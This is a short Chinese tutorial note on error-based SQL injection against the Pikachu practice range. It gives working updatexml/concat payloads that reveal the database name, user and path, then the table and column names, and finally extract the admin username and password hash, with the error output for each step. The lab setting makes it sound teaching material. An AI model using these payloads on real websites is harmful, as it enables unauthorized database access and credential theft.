# 报错注入

---

（本案例使用pikachu靶场）

报错显示限制一般为32位



## 判断注入

name='

name=' or 1=1

name=' or 1=2



## payload

```
name=' or updatexml(1,concat(0x7e,(注入语句或者函数),0x7e),0) or '
```



## 查询数据库信息

name=' or updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir),0) or '

出现：（0x7e为~，使用database()查询当前使用的数据库名）如果后面显示不出来就单个单个的查询

XPATH syntax error: '~pikachu~kobe~D:/phpstudy/'



## 查询当前数据库的表（找users表）

name=' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database() ),0x7e),0) or '

出现：

XPATH syntax error: '~httpinfo,member,message,users,x'



## 查询表字段 （找user表的字段）

name=' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name = 'users'  ),0x7e),0) or '

出现：

XPATH syntax error: '~USER,CURRENT_CONNECTIONS,TOTAL_'



## 查询表数据 （找user的用户名和密码）

name=' or updatexml(1,concat(0x7e,(select username from users limit 0,1 ),0x7e,(select password from users limit 0,1)),0) or '

出现：（查询的结果不能多行，查询字段只能一列，使用拼接）（只看0开始第1个，后续改0即可）

XPATH syntax error: '~admin~e10adc3949ba59abbe56e057f'